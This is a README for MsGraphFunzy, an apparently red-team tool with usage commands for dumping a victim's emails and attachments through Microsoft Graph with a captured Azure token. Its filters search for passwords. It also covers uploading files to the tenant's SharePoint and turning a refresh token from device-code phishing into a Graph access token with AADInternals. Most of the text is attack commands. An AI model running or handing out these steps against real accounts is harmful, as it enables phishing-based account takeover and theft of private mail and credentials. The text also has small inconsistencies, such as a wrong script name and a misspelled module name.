# MsGraphFunzy
Script to dump emails through Microsoft Graph API. it also include another script to push a file on the Azure tenant.

# Usage graph_dump.py

This script dump emails and attachments

```
python3 graph_dump.py extended_azure_token_file_path (optional filter)
```
# Filter examples

```
body:password
subject:password
attachment:password

python3 graph_dump.py extended_azure_token_file_path body:password
```

# Usage push_sharepoint.py 

This script can be used to host on file on an Azure tenant

```
python3 extract_email.py extended_azure_token_file_path file_to_upload_path remote_filename (optional -organization)
```

# Device code phishing extended scope

```
PS> install-module aadinternals
PS> import-module addinternals
PS> $t = Get-AADIntAccessTokenWithRefreshToken -clientid "d3590ed6-52b3-4102-aeff-aad2292ab01c" -resource "https://graph.microsoft.com" -tenantid "" -refreshtoken "" -savetocache 1 -includerefreshtoken 1
PS> Write-Output $t
```

# Credit
Mr.Un1k0d3r RingZer0 Team
